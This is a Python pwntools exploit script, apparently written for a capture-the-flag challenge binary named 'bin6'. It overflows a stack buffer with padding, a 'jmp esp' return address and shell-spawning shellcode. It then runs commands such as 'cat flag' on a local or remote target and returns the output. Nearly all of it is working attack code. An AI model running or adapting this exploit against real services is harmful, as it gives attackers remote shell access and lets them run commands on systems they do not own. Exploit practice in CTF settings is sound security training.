import string
from pwn import *
from struct import pack

def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local:

		p = process(binary)

	else:

		p = remote(ip,port,timeout=timeout)
	
	try:	
		shellcode = 'A'*27+'\x00'

		shellcode += pack('<I', 0x080df1df)  # jmp esp
		shellcode += asm(shellcraft.sh())


		p.recvuntil('input the string you want to convert:',timeout=timeout)
		# print hex(len(shellcode))
		# gdb.attach(p,'b *0x08048BE6')
		p.sendline(shellcode)
		
		p.sendline('echo 123')

		p.recvuntil('123',timeout=timeout)

		p.sendline(msg)

		p.sendline('echo 456')

		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()
		return flag[:-3]
	except:
		p.close()
		return ''
		
if __name__ == '__main__':
	print exp(True,'bin6','cat flag')
